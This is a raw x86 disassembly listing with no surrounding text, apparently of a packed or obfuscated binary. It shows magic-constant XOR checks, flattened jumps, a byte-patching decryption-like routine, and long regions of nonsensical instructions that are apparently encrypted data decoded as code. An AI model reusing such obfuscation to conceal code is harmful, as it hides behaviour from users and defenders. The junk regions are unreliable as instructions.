  405629:	mov    ebx,ecx
  40562b:	xor    ecx,edx
  40562d:	shrd   eax,ecx,0x2
  405631:	or     eax,DWORD PTR [ebp+0x10]
  405634:	shr    ecx,0x2
  405637:	mov    DWORD PTR [ebp+0x8],eax
  40563a:	mov    eax,ecx
  40563c:	or     eax,DWORD PTR [ebp+0x14]
  40563f:	mov    ecx,DWORD PTR [ebx]
  405641:	mov    edx,DWORD PTR [ebx+0x4]
  405644:	push   eax
  405645:	push   DWORD PTR [ebp+0x8]
  405648:	push   edx
  405649:	push   ecx
  40564a:	call   0x421ba4
  40564f:	mov    eax,DWORD PTR [esi]
  405651:	mov    ecx,DWORD PTR [esi+0x4]
  405654:	shrd   eax,ecx,0x2
  405658:	shr    ecx,0x2
  40565b:	shr    edx,0x1e
  40565e:	xor    ecx,0xe74ae2be
  405664:	push   ecx
  405665:	xor    eax,edi
  405667:	mov    DWORD PTR [ebp+0x10],edx
  40566a:	mov    edx,DWORD PTR [ebx]
  40566c:	mov    edi,DWORD PTR [ebx+0x4]
  40566f:	push   eax
  405670:	push   edi
  405671:	push   edx
  405672:	call   0x421ba4
  405677:	shld   edx,eax,0x2
  40567b:	mov    ecx,edx
  40567d:	xor    edx,edx
  40567f:	or     ecx,edx
  405681:	mov    edx,DWORD PTR [esi]
  405683:	mov    edi,DWORD PTR [esi+0x4]
  405686:	shl    eax,0x2
  405689:	or     eax,DWORD PTR [ebp+0x10]
  40568c:	xor    edi,ecx
  40568e:	xor    edx,eax
  405690:	xor    edx,0xcb89b676
  405696:	xor    edi,0x9d2b8af8
  40569c:	mov    DWORD PTR [esi],edx
  40569e:	mov    DWORD PTR [esi+0x4],edi
  4056a1:	jmp    0x4066a8
  4056a6:	mov    eax,DWORD PTR [ebp-0x24]
  4056a9:	add    eax,DWORD PTR [ebp-0x4]
  4056ac:	mov    DWORD PTR [ebp-0x28],eax
  4056af:	mov    eax,DWORD PTR [ebp-0x28]
  4056b2:	mov    eax,DWORD PTR [ebp-0x4]
  4056b5:	mov    eax,DWORD PTR [ebp-0x28]
  4056b8:	mov    eax,DWORD PTR [eax+0xc]
  4056bb:	mov    edx,DWORD PTR [ebp-0x4]
  4056be:	movzx  eax,WORD PTR [edx+eax*1]
  4056c2:	cdq    
  4056c3:	shld   edx,eax,0x2
  4056c7:	jmp    0x405971
  4056cc:	fs fcomp st(2)
  4056cf:	das    
  4056d0:	ja     0x40570f
  4056d2:	mov    ah,0x99
  4056d4:	outs   dx,DWORD PTR ds:[esi]
  4056d5:	aad    0x13
  4056d7:	inc    ebp
  4056d8:	les    esp,FWORD PTR [esi]
  4056da:	popa   
  4056db:	xor    edi,edi
  4056dd:	sbb    BYTE PTR [ebx-0x44402f45],bh
  4056e3:	mov    ebx,0x403e3efb
  4056e8:	sbb    al,BYTE PTR [ecx+0x79615f7c]
  4056ee:	push   esi
  4056ef:	and    al,0x3b
  4056f1:	imul   edi,ecx,0x35
  4056f4:	adc    al,0x90
  4056f6:	dec    DWORD PTR [eax]
  4056f8:	int3   
  4056f9:	sub    dh,bl
  4056fb:	xchg   esi,eax
  4056fc:	xchg   BYTE PTR [ecx+0x2],dh
  4056ff:	pop    ss
  405700:	dec    ecx
  405701:	popa   
  405702:	es inc ebx
  405704:	sub    DWORD PTR [edx-0x62eb70d6],ebp
  40570a:	mov    ebx,0xef693580
  40570f:	pop    ss
  405710:	call   0xcb91893a
  405715:	push   eax
  405716:	mov    eax,0xa10800d1
  40571b:	push   ebp
  40571c:	inc    esi
  40571d:	lock pop esp
  40571f:	mov    ah,0xd4
  405721:	int3   
  405722:	adc    ah,BYTE PTR [eax-0x6c]
  405725:	jg     0x4056f6
  405727:	call   0xccf5:0x306fa3d9
  40572e:	mov    bl,0x56
  405730:	mul    BYTE PTR [edx-0x35154a4a]
  405736:	or     ah,bl
  405738:	or     eax,0x68a42351
  40573d:	mov    ch,0x1d
  40573f:	xchg   DWORD PTR [eax-0x187d5deb],esi
  405745:	jmp    0xf19a:0xcc6383d0
  40574c:	repnz xor cl,bh
  40574f:	sar    DWORD PTR [edi],0x1c
  405752:	loopne 0x4057af
  405754:	mov    ebx,0x1921e089
  405759:	mov    al,0x38
  40575b:	inc    esi
  40575c:	sti    
  40575d:	push   ds
  40575e:	mov    DWORD PTR [edi],ecx
  405760:	cmp    BYTE PTR [edi-0x5eb7c54],dl
  405766:	out    dx,eax
  405767:	adc    DWORD PTR [ecx],edx
  405769:	sahf   
  40576a:	sub    al,0x7
  40576c:	std    
  40576d:	mov    eax,ds:0x40f0411a
  405772:	pushf  
  405773:	popa   
  405774:	pusha  
  405775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405776:	fcom   QWORD PTR [ebp-0x208f5b47]
  40577c:	mov    ch,0x9a
  40577e:	xchg   esp,eax
  40577f:	sub    BYTE PTR [ebp+edx*8-0x49ef55b2],bh
  405786:	add    al,0x25
  405788:	mov    eax,0xb2c42316
  40578d:	(bad)  
  40578e:	and    dl,ah
  405790:	dec    eax
  405791:	add    DWORD PTR [esi+edi*4+0x446bca73],0x2f
  405799:	daa    
  40579a:	dec    ebx
  40579b:	xchg   ebp,eax
  40579c:	inc    esi
  40579d:	fadd   st(3),st
  40579f:	xchg   edi,eax
  4057a0:	popf   
  4057a1:	xchg   esi,eax
  4057a2:	call   0xd9ab:0x1bc7043e
  4057a9:	mov    cl,0x26
  4057ab:	repnz sub BYTE PTR cs:[esp+ecx*8],dl
  4057b0:	fidiv  DWORD PTR [ecx-0x3da84a22]
  4057b6:	retf   0x2ec1
  4057b9:	pop    eax
  4057ba:	aas    
  4057bb:	pop    es
  4057bc:	cmp    DWORD PTR [ecx+0x44],ecx
  4057bf:	enter  0xc9b0,0xd7
  4057c3:	fld    DWORD PTR [ecx+0x13]
  4057c6:	inc    ecx
  4057c7:	into   
  4057c8:	arpl   WORD PTR [esi],bp
  4057ca:	inc    edx
  4057cb:	rcr    BYTE PTR [edx+0x36b24e74],0xde
  4057d2:	inc    ebx
  4057d3:	sbb    ah,dh
  4057d5:	enter  0x90d0,0x2a
  4057d9:	(bad)
  4057dd:	add    esp,DWORD PTR [ebx-0x6]
  4057e0:	push   eax
  4057e1:	sub    eax,0xc15edc23
  4057e6:	sahf   
  4057e7:	fidiv  WORD PTR [eax]
  4057e9:	xor    eax,0xa6d1e77c
  4057ee:	enter  0x2925,0x1d
  4057f2:	add    edi,DWORD PTR [ebx+0x5c]
  4057f5:	adc    cl,dl
  4057f7:	outs   dx,BYTE PTR ds:[esi]
  4057f8:	cdq    
  4057f9:	fisub  WORD PTR [edi+0x2521319d]
  4057ff:	mov    ebx,0xe6d063b1
  405804:	dec    esi
  405805:	aad    0xe
  405807:	mov    eax,0x4420217
  40580c:	les    ebx,FWORD PTR [edx]
  40580e:	jnp    0x4057c3
  405810:	jo     0x405821
  405812:	xchg   edx,eax
  405813:	mov    eax,0x9f9acc66
  405818:	mov    ebp,0x76f42795
  40581d:	hlt    
  40581e:	push   esi
  40581f:	lds    esp,FWORD PTR [edx]
  405821:	addr16 jg 0x40581b
  405824:	shl    BYTE PTR [edi-0x56],0x8a
  405828:	and    ebx,DWORD PTR [ecx+0x49]
  40582b:	pop    ss
  40582c:	fild   WORD PTR [ebp+0x31]
  40582f:	add    ch,BYTE PTR [ebx]
  405831:	mov    dl,0x8e
  405833:	adc    BYTE PTR [ecx-0x3788df1e],bl
  405839:	cmc    
  40583a:	mov    edi,0x3bcf3cfb
  40583f:	and    BYTE PTR [eax-0x79de8585],bh
  405845:	dec    ebp
  405846:	fwait
  405847:	inc    esp
  405848:	dec    eax
  405849:	daa    
  40584a:	dec    ebx
  40584b:	sub    ebx,DWORD PTR [edx+0xa]
  40584e:	pushf  
  40584f:	jge    0x405862
  405851:	and    DWORD PTR cs:0x5c0cc15,esp
  405858:	mov    ds:0xbf408740,al
  40585d:	pop    ds
  40585e:	jnp    0x40587f
  405860:	pop    ebp
  405861:	xchg   ecx,eax
  405862:	inc    ebp
  405863:	jg     0x4058a7
  405865:	mov    ds:0x207e7c9c,eax
  40586a:	xchg   esi,eax
  40586b:	imul   edi,DWORD PTR [ebp+0x7e26f44b],0x6643709e
  405875:	enter  0xb34d,0x37
  405879:	sub    edx,DWORD PTR [edx]
  40587b:	or     al,0x54
  40587d:	add    DWORD PTR [ecx-0x6e5c9bda],ebp
  405883:	dec    edi
  405884:	push   esi
  405885:	xor    cl,cl
  405887:	dec    edi
  405888:	dec    ebp
  405889:	mov    eax,ds:0xb5b90b18
  40588e:	jbe    0x405848
  405890:	loopne 0x405886
  405892:	(bad)
  405895:	adc    eax,0xb13b702d
  40589a:	pusha  
  40589b:	and    bl,BYTE PTR [ebp+0x13478243]
  4058a1:	cmc    
  4058a2:	scas   al,BYTE PTR es:[edi]
  4058a3:	add    DWORD PTR ds:0x5821535a,edx
  4058a9:	mul    BYTE PTR [ebx-0x15]
  4058ac:	xor    DWORD PTR ds:[ebx-0x3a1f7d2f],esp
  4058b3:	ret    
  4058b4:	mov    BYTE PTR [ecx+ebp*2],bl
  4058b7:	aam    0x74
  4058b9:	stos   DWORD PTR es:[edi],eax
  4058ba:	inc    esi
  4058bb:	jmp    0x4058c9
  4058bd:	dec    edx
  4058be:	push   esi
  4058bf:	repnz bnd jbe 0x4058b2
  4058c3:	ret    
  4058c4:	and    esi,edx
  4058c6:	pop    esp
  4058c7:	loop   0x405873
  4058c9:	scas   al,BYTE PTR es:[edi]
  4058ca:	xor    edi,DWORD PTR ds:0xed36dda1
  4058d0:	dec    esi
  4058d1:	fnsave [ecx-0x632d788e]
  4058d7:	xchg   esi,eax
  4058d8:	push   edx
  4058d9:	ret    0xc0d
  4058dc:	cmp    ch,BYTE PTR [edx]
  4058de:	sbb    esp,DWORD PTR [ecx+0x39]
  4058e1:	push   esi
  4058e2:	dec    ebp
  4058e3:	test   al,0xa4
  4058e5:	aam    0xe1
  4058e7:	mov    cl,0x9c
  4058e9:	xchg   esi,eax
  4058ea:	ins    BYTE PTR es:[edi],dx
  4058eb:	xchg   esp,eax
  4058ec:	lods   al,BYTE PTR ds:[esi]
  4058ed:	sar    BYTE PTR [esi+0x5f],1
  4058f0:	push   esi
  4058f1:	repnz xchg esi,esi
  4058f4:	mov    eax,ds:0x6ad84a27
  4058f9:	or     DWORD PTR [ebx+0x52],0x485c4456
  405900:	mov    DWORD PTR [eax+0x4c],eax
  405903:	(bad)  
  405904:	idiv   DWORD PTR ds:0xb88d5e7c
  40590a:	mov    cl,BYTE PTR [edx]
  40590c:	enter  0x9833,0x99
  405910:	xchg   esi,eax
  405911:	shl    DWORD PTR [esi+0x57],0x45
  405915:	nop
  405916:	cmc    
  405917:	popa   
  405918:	ret    0xd689
  40591b:	mov    esp,0x2bee5dc7
  405920:	mov    ecx,0x166661a2
  405925:	lods   eax,DWORD PTR ds:[esi]
  405926:	push   esi
  405927:	fstp   TBYTE PTR [esi-0x31]
  40592a:	jecxz  0x405999
  40592c:	jmp    0x77597fac
  405931:	ret    0x20dd
  405934:	add    ebp,DWORD PTR [edx-0x57aad138]
  40593a:	aas    
  40593b:	mov    ds:0xfee59eac,eax
  405940:	jle    0x40591a
  405942:	inc    edi
  405943:	clc    
  405944:	mov    ch,0xd0
  405946:	cmp    ecx,ecx
  405948:	in     eax,dx
  405949:	mov    ds:0x4e0af4e9,al
  40594e:	lods   al,BYTE PTR ds:[esi]
  40594f:	rcl    BYTE PTR [ebp-0x53b48dd5],1
  405955:	ror    DWORD PTR [ebp-0x2bf3b27c],1
  40595b:	outs   dx,BYTE PTR ds:[esi]
  40595c:	daa    
  40595d:	dec    ecx
  40595e:	pop    ds
  40595f:	cmp    cl,ch
  405961:	js     0x40599e
  405963:	fistp  WORD PTR [ecx]
  405965:	mov    esp,0xd455d128
  40596a:	dec    esi
  40596b:	cs sub eax,0xf08c4355
  405971:	xor    edx,ecx
  405973:	mov    DWORD PTR [ebp+0xc],edx
  405976:	mov    edx,DWORD PTR [ebp-0x58]
  405979:	shl    eax,0x2
  40597c:	mov    DWORD PTR [ebp+0x10],edx
  40597f:	mov    edx,DWORD PTR [ebp-0x54]
  405982:	xor    eax,0xcb89b676
  405987:	mov    DWORD PTR [ebp+0x14],edx
  40598a:	cmp    eax,DWORD PTR [ebp+0x10]
  40598d:	jne    0x405b6c
  405993:	mov    eax,edx
  405995:	cmp    DWORD PTR [ebp+0xc],eax
  405998:	jne    0x405b6c
  40599e:	mov    DWORD PTR [ebp+0x8],0xcb89b676
  4059a5:	mov    DWORD PTR [ebp+0xc],ecx
  4059a8:	mov    DWORD PTR [ebp-0x60],0xcb89b672
  4059af:	mov    DWORD PTR [ebp-0x5c],ecx
  4059b2:	mov    DWORD PTR [ebp-0x48],0xcb89b67e
  4059b9:	mov    DWORD PTR [ebp-0x44],ecx
  4059bc:	mov    DWORD PTR [ebp-0x38],0xcb89b67a
  4059c3:	mov    DWORD PTR [ebp-0x34],ecx
  4059c6:	mov    eax,DWORD PTR [ebp+0x8]
  4059c9:	mov    ecx,DWORD PTR [ebp+0xc]
  4059cc:	shrd   eax,ecx,0x2
  4059d0:	shr    ecx,0x2
  4059d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4059d6:	mov    edx,DWORD PTR [ebp+0xc]
  4059d9:	xor    eax,edi
  4059db:	shl    ecx,0x1e
  4059de:	xor    edx,edx
  4059e0:	or     eax,edx
  4059e2:	add    eax,DWORD PTR ds:0x4222d8
  4059e8:	mov    DWORD PTR [ebp+0x14],eax
  4059eb:	mov    eax,DWORD PTR [ebp+0x8]
  4059ee:	mov    ecx,DWORD PTR [ebp+0xc]
  4059f1:	shrd   eax,ecx,0x2
  4059f5:	shr    ecx,0x2
  4059f8:	mov    ecx,DWORD PTR [ebp+0x8]
  4059fb:	mov    edx,DWORD PTR [ebp+0xc]
  4059fe:	xor    eax,edi
  405a00:	shl    ecx,0x1e
  405a03:	xor    edx,edx
  405a05:	or     eax,edx
  405a07:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  405a0b:	mov    eax,DWORD PTR [ebp+0x14]
  405a0e:	xor    BYTE PTR [eax],cl
  405a10:	mov    eax,DWORD PTR [ebp-0x60]
  405a13:	mov    ecx,DWORD PTR [ebp-0x5c]
  405a16:	shrd   eax,ecx,0x2
  405a1a:	shr    ecx,0x2
  405a1d:	mov    ecx,DWORD PTR [ebp-0x60]
  405a20:	mov    edx,DWORD PTR [ebp-0x5c]
  405a23:	xor    eax,edi
  405a25:	shl    ecx,0x1e
  405a28:	xor    edx,edx
  405a2a:	or     eax,edx
  405a2c:	add    eax,DWORD PTR ds:0x4222d8
  405a32:	mov    DWORD PTR [ebp+0x14],eax
  405a35:	mov    eax,DWORD PTR [ebp-0x60]
  405a38:	mov    ecx,DWORD PTR [ebp-0x5c]
  405a3b:	shrd   eax,ecx,0x2
  405a3f:	shr    ecx,0x2
  405a42:	mov    ecx,DWORD PTR [ebp-0x60]
  405a45:	mov    edx,DWORD PTR [ebp-0x5c]
  405a48:	xor    eax,edi
  405a4a:	shl    ecx,0x1e
  405a4d:	xor    edx,edx
  405a4f:	or     eax,edx
  405a51:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  405a55:	mov    eax,DWORD PTR [ebp+0x14]
  405a58:	or     BYTE PTR [eax],cl
  405a5a:	mov    eax,DWORD PTR [ebp-0x48]
  405a5d:	mov    ecx,DWORD PTR [ebp-0x44]
  405a60:	shrd   eax,ecx,0x2
  405a64:	shr    ecx,0x2
  405a67:	mov    ecx,DWORD PTR [ebp-0x48]
  405a6a:	mov    edx,DWORD PTR [ebp-0x44]
  405a6d:	xor    eax,edi
  405a6f:	xor    edx,edx
  405a71:	or     eax,edx
  405a73:	add    eax,DWORD PTR ds:0x4222d8
  405a79:	shl    ecx,0x1e
  405a7c:	mov    DWORD PTR [ebp+0x14],eax
  405a7f:	mov    eax,DWORD PTR [ebp-0x48]
  405a82:	mov    ecx,DWORD PTR [ebp-0x44]
  405a85:	shrd   eax,ecx,0x2
  405a89:	shr    ecx,0x2
  405a8c:	mov    ecx,DWORD PTR [ebp-0x48]
  405a8f:	mov    edx,DWORD PTR [ebp-0x44]
  405a92:	xor    eax,edi
  405a94:	shl    ecx,0x1e
  405a97:	xor    edx,edx
  405a99:	or     eax,edx
  405a9b:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  405a9f:	mov    eax,DWORD PTR [ebp+0x14]
  405aa2:	add    BYTE PTR [eax],cl
  405aa4:	mov    eax,DWORD PTR [ebp-0x38]
  405aa7:	mov    ecx,DWORD PTR [ebp-0x34]
  405aaa:	shrd   eax,ecx,0x2
  405aae:	xor    eax,edi
  405ab0:	shr    ecx,0x2
  405ab3:	mov    ecx,DWORD PTR [ebp-0x38]
  405ab6:	mov    edx,DWORD PTR [ebp-0x34]
  405ab9:	shl    ecx,0x1e
  405abc:	mov    ecx,DWORD PTR [ebp-0x38]
  405abf:	xor    edx,edx
  405ac1:	or     eax,edx
  405ac3:	mov    edx,DWORD PTR [ebp-0x34]
  405ac6:	add    eax,DWORD PTR ds:0x4222d8
  405acc:	shrd   ecx,edx,0x2
  405ad0:	xor    ecx,edi
  405ad2:	shr    edx,0x2
  405ad5:	mov    edx,DWORD PTR [ebp-0x38]
  405ad8:	mov    edi,DWORD PTR [ebp-0x34]
  405adb:	xor    edi,edi
  405add:	or     ecx,edi
  405adf:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  405ae3:	or     BYTE PTR [eax],cl
  405ae5:	mov    eax,DWORD PTR [esi]
  405ae7:	mov    ecx,DWORD PTR [esi+0x4]
  405aea:	shl    eax,0x1e
  405aed:	shl    edx,0x1e
  405af0:	mov    edx,DWORD PTR [esi]
  405af2:	mov    edi,DWORD PTR [esi+0x4]
  405af5:	xor    edi,0x9d2b8af8
  405afb:	xor    eax,0x80000000
  405b00:	mov    DWORD PTR [ebp+0x14],eax
  405b03:	mov    eax,0xcb89b677
  405b08:	xor    edx,eax
  405b0a:	shrd   edx,edi,0x2
  405b0e:	shr    edi,0x2
  405b11:	or     edi,DWORD PTR [ebp+0x14]
  405b14:	xor    ecx,ecx
  405b16:	or     edx,ecx
  405b18:	mov    ecx,DWORD PTR [ebx]
  405b1a:	mov    DWORD PTR [ebp-0x64],edi
  405b1d:	mov    edi,DWORD PTR [ebx+0x4]
  405b20:	mov    edi,ecx
  405b22:	xor    ecx,ecx
  405b24:	shl    edi,0x1e
  405b27:	xor    edi,0x80000000
  405b2d:	mov    DWORD PTR [ebp+0x10],ecx
  405b30:	mov    ecx,DWORD PTR [ebx]
  405b32:	mov    DWORD PTR [ebp+0x14],edi
  405b35:	mov    edi,DWORD PTR [ebx+0x4]
  405b38:	xor    ecx,eax
  405b3a:	xor    edi,0x9d2b8af8
  405b40:	shrd   ecx,edi,0x2
  405b44:	or     ecx,DWORD PTR [ebp+0x10]
  405b47:	shr    edi,0x2
  405b4a:	mov    DWORD PTR [ebp-0x70],ecx
  405b4d:	mov    ecx,edi
  405b4f:	or     ecx,DWORD PTR [ebp+0x14]
  405b52:	mov    DWORD PTR [ebp+0xc],edi
  405b55:	cmp    edx,DWORD PTR [ebp-0x70]
  405b58:	jne    0x4069dd
  405b5e:	cmp    DWORD PTR [ebp-0x64],ecx
  405b61:	jne    0x4069dd
  405b67:	jmp    0x4066ad
  405b6c:	mov    eax,DWORD PTR [esi]
  405b6e:	mov    edx,DWORD PTR [esi+0x4]
  405b71:	mov    eax,DWORD PTR [esi]
  405b73:	mov    edx,DWORD PTR [esi+0x4]
  405b76:	mov    edx,eax
  405b78:	xor    eax,eax
  405b7a:	shl    edx,0x1e
  405b7d:	mov    DWORD PTR [ebp+0x10],eax
  405b80:	mov    eax,DWORD PTR [esi]
  405b82:	jmp    0x405e2c
  405b87:	(bad)  
  405b89:	mov    bh,0xc4
  405b8b:	mov    bh,0xa5
  405b8d:	mov    ebp,0x6d904e1d
  405b92:	inc    ebp
  405b93:	loope  0x405b23
  405b95:	ins    DWORD PTR es:[edi],dx
  405b96:	inc    ebp
  405b97:	adc    al,0x1a
  405b99:	mov    ebx,0xbbbfd0bb
  405b9e:	mov    ebx,0x11741a91
  405ba3:	sub    edx,DWORD PTR [edx]
  405ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ba6:	pop    es
  405ba7:	popa   
  405ba8:	fst    DWORD PTR [eax-0x4d6258c5]
  405bae:	dec    esi
  405baf:	stc    
  405bb0:	dec    edx
  405bb1:	mov    ch,0x47
  405bb3:	popa   
  405bb4:	and    edx,ecx
  405bb6:	repz mov ds:0xcee3e347,eax
  405bbc:	inc    edi
  405bbd:	mov    esp,DWORD PTR [eax-0x53c89d4]
  405bc3:	pop    ebx
  405bc4:	pop    edx
  405bc5:	jno    0x405b93
  405bc7:	xchg   ebx,eax
  405bc8:	test   BYTE PTR [ecx+ebx*4+0x5c3b2118],ch
  405bcf:	pop    edx
  405bd0:	mov    ah,0xac
  405bd2:	out    dx,al
  405bd3:	ret    0x50e9
  405bd6:	ja     0x405c29
  405bd8:	stos   DWORD PTR es:[edi],eax
  405bd9:	pop    ebp
  405bda:	cdq    
  405bdb:	cmp    eax,0x649d1431
  405be0:	and    ebx,DWORD PTR [bp+di-0x4f4e]
  405be5:	dec    ebx
  405be6:	test   eax,0x10071eb8
  405beb:	jmp    0xcc2a:0xf5dd71f8
  405bf2:	mov    bl,0xde
  405bf4:	ret    0xce75
  405bf7:	int    0x85
  405bf9:	scas   eax,DWORD PTR es:[edi]
  405bfa:	xchg   esp,eax
  405bfb:	sbb    dh,BYTE PTR [eax+ecx*4]
  405bfe:	aad    0x9b
  405c00:	es icebp 
  405c02:	adc    ebx,DWORD PTR [edi-0x59d3e835]
  405c08:	jmp    0xb97a:0x6ed0034
  405c0f:	xchg   ecx,eax
  405c10:	scas   eax,DWORD PTR es:[edi]
  405c11:	inc    edx
  405c12:	pop    ecx
  405c13:	cmp    ebx,DWORD PTR [ecx-0x4c]
  405c16:	test   eax,0xc5b08236
  405c1b:	in     al,dx
  405c1c:	ret    
  405c1d:	cmp    al,0xcb
  405c1f:	enter  0x462a,0x40
  405c23:	cmp    al,0x97
  405c25:	shl    eax,0xfe
  405c28:	(bad)  
  405c29:	icebp  
  405c2a:	mov    ds:0x400d1147,eax
  405c2f:	loop   0x405c62
  405c31:	jo     0x405bde
  405c33:	iret   
  405c34:	test   BYTE PTR [ebx+0x4d],cl
  405c37:	mov    cl,0x40
  405c39:	mov    ds:0x67b117a9,eax
  405c3e:	scas   al,BYTE PTR es:[edi]
  405c3f:	ror    cl,1
  405c41:	(bad)  
  405c42:	mov    ah,0x5c
  405c44:	jmp    0xf7aacc54
  405c49:	fwait
  405c4a:	and    dl,bl
  405c4c:	sub    al,0xd6
  405c4e:	lea    ebp,[esi+0x619eadfc]
  405c54:	xchg   ecx,eax
  405c55:	rcr    DWORD PTR [edi],cl
  405c57:	inc    edi
  405c58:	mov    ah,BYTE PTR [ebx-0x41]
  405c5b:	mov    cl,0x51
  405c5d:	adc    DWORD PTR ds:[esi],ebp
  405c60:	push   esi
  405c61:	(bad)  
  405c62:	mov    al,ds:0x568079a3
  405c67:	cwde   
  405c68:	xchg   edx,eax
  405c69:	out    dx,al
  405c6a:	xchg   edi,eax
  405c6b:	mov    al,0x1
  405c6d:	jnp    0x405c7f
  405c6f:	dec    ecx
  405c70:	retf   
  405c71:	repz aam 0xca
  405c74:	mov    edx,0x918fe88a
  405c79:	pop    ds
  405c7a:	push   esp
  405c7b:	rcl    ah,0x2d
  405c7e:	add    cl,BYTE PTR [esi-0x7f]
  405c81:	(bad)  
  405c82:	lods   al,BYTE PTR ds:[esi]
  405c83:	or     ah,al
  405c85:	add    al,0xa9
  405c87:	mov    eax,ds:0x5e499e7d
  405c8c:	push   ecx
  405c8d:	cwde   
  405c8e:	inc    esi
  405c8f:	pop    ebp
  405c90:	add    eax,DWORD PTR [edx+0x1a72f0fa]
  405c96:	rol    BYTE PTR [ecx+0x7c6ed789],1
  405c9c:	lods   eax,DWORD PTR ds:[esi]
  405c9d:	xor    DWORD PTR [ebp+0x52],0xffffffcd
  405ca1:	test   DWORD PTR [esi+eiz*8],0x2cf26254
  405ca8:	arpl   cx,dx
  405caa:	jg     0x405cf3
  405cac:	mov    dl,0x46
  405cae:	dec    eax
  405caf:	lods   al,BYTE PTR cs:[esi]
  405cb1:	in     al,dx
  405cb2:	fadd   st(4),st
  405cb4:	inc    ebx
  405cb5:	xor    dl,0xc8
  405cb8:	push   0x16
  405cba:	ins    DWORD PTR es:[edi],dx
  405cbb:	inc    ebx
  405cbc:	ja     0x405cbc
  405cbe:	call   0x9247:0x43fc0b5c
  405cc5:	jbe    0x405c94
  405cc7:	push   ebp
  405cc8:	fisttp QWORD PTR ds:0xd4ee693f
  405cce:	(bad)  
  405ccf:	cwde   
  405cd0:	mov    dl,0x6d
  405cd2:	repz inc ebx
  405cd4:	xlat   BYTE PTR ds:[ebx]
  405cd5:	leave  
  405cd6:	mov    ds:0xd4950914,eax
  405cdb:	inc    ebx
  405cdc:	fld    TBYTE PTR [eax+0x5bfc79a4]
  405ce2:	jp     0x405d57
  405ce4:	push   0x6f
  405ce6:	xchg   ebx,eax
  405ce7:	cwde   
  405ce8:	mov    cl,0x50
  405cea:	jmp    0x9bb5c6bc
  405cef:	in     eax,0x62
  405cf1:	addr16 gs xchg edi,eax
  405cf4:	adc    al,BYTE PTR [edi-0x677893f8]
  405cfa:	stc    
  405cfb:	scas   eax,DWORD PTR es:[edi]
  405cfc:	sub    BYTE PTR [edi-0x775d09f2],dh
  405d02:	mov    cs,ebp
  405d04:	push   esi
  405d05:	pop    es
  405d06:	cs or  al,0x2f
  405d09:	shl    dl,0xb9
  405d0c:	xchg   edx,eax
  405d0d:	cmp    ah,BYTE PTR [edi-0x62fd0028]
  405d13:	ins    DWORD PTR es:[edi],dx
  405d14:	stc    
  405d15:	xlat   BYTE PTR ds:[ebx]
  405d16:	scas   eax,DWORD PTR es:[edi]
  405d17:	ficom  DWORD PTR [ecx]
  405d19:	xchg   ebp,eax
  405d1a:	or     al,0xc
  405d1c:	(bad)  
  405d1d:	mov    bl,0xb0
  405d1f:	leave  
  405d20:	fsub   DWORD PTR [edi+0x28b7d629]
  405d26:	ins    BYTE PTR es:[edi],dx
  405d27:	int    0x54
  405d29:	inc    ecx
  405d2a:	add    BYTE PTR [esi],dh
  405d2c:	popa   
  405d2d:	cmc    
  405d2e:	and    eax,0x4c5d6c1d
  405d33:	inc    esi
  405d34:	mov    DWORD PTR [edx-0x79],ebx
  405d37:	push   ss
  405d38:	adc    DWORD PTR [edx],esi
  405d3a:	fwait
  405d3b:	andps  xmm1,XMMWORD PTR [ebp+0x1c]
  405d3f:	(bad)  
  405d40:	ret    0x15b3
  405d43:	and    DWORD PTR [edx],ebx
  405d45:	jb     0x405d1e
  405d47:	daa    
  405d48:	or     DWORD PTR [ecx+0x453b7f0b],ecx
  405d4e:	jg     0x405d7a
  405d50:	sbb    ebp,0xbb846f49
  405d56:	daa    
  405d57:	mov    BYTE PTR [edi-0xc],bl
  405d5a:	push   cs
  405d5b:	in     eax,dx
  405d5c:	mov    cl,0xd1
  405d5e:	push   esp
  405d5f:	(bad)  
  405d60:	in     eax,dx
  405d61:	push   esp
  405d62:	call   0xe7d:0xb78c8d2a
  405d69:	pop    ecx
  405d6a:	leave  
  405d6b:	push   esi
  405d6c:	push   ds
  405d6d:	aad    0xfb
  405d6f:	lods   al,BYTE PTR ds:[esi]
  405d70:	in     al,dx
  405d71:	fistp  DWORD PTR [edi]
  405d73:	jle    0x405d3c
  405d75:	jae    0x405dba
  405d77:	push   0xefd942ef
  405d7c:	cs loope 0x405dc7
  405d7f:	sbb    BYTE PTR [esp+ebp*8],cl
  405d82:	inc    edi
  405d83:	jnp    0x405dc4
  405d85:	(bad)  [ebp+ebx*1+0x28]
  405d89:	icebp  
  405d8a:	inc    esi
  405d8b:	inc    esp
  405d8c:	ja     0x405dc5
  405d8e:	pop    es
  405d8f:	mov    cl,0xfb
  405d91:	lock mov bh,0x64
  405d94:	xor    al,0xf3
  405d96:	inc    edi
  405d97:	out    dx,al
  405d98:	or     bl,BYTE PTR [edi+0x463d56c4]
  405d9e:	repnz inc ebp
  405da0:	das    
  405da1:	adc    al,0x71
  405da3:	jle    0x405e10
  405da5:	xchg   ecx,eax
  405da6:	ror    cl,1
  405da8:	mov    ebx,0xe62fcf39
  405dad:	neg    BYTE PTR [eax]
  405daf:	adc    BYTE PTR [eax-0x4d7086a1],bl
  405db5:	xchg   edi,eax
  405db6:	dec    eax
  405db7:	sub    eax,0xa5faae3e
  405dbc:	xor    DWORD PTR [edx-0x9],ebp
  405dbf:	mul    dl
  405dc1:	or     al,ch
  405dc3:	es sti 
  405dc5:	mov    ebp,0xf6b2af45
  405dca:	lahf   
  405dcb:	test   al,0xe4
  405dcd:	(bad)  [eax+0x67]
  405dd0:	ja     0x405db0
  405dd2:	push   ecx
  405dd3:	push   ebx
  405dd4:	or     DWORD PTR [eax-0x19111c3],eax
  405dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ddb:	sbb    bl,ch
  405ddd:	std    
  405dde:	add    DWORD PTR [edi],ebx
  405de0:	push   ebp
  405de1:	fldcw  WORD PTR [edx-0x63]
  405de5:	aad    0x17
  405de7:	cs cs dec ebx
  405dea:	addr16 adc eax,0x1f85caeb
  405df0:	aad    0x28
  405df2:	inc    ebp
  405df3:	xor    ch,0x34
  405df6:	(bad)  
  405df7:	mov    bh,0x56
  405df9:	mov    edx,DWORD PTR [edi+0x6ab3f1c2]
  405dff:	lods   eax,DWORD PTR ds:[esi]
  405e00:	stos   BYTE PTR es:[edi],al
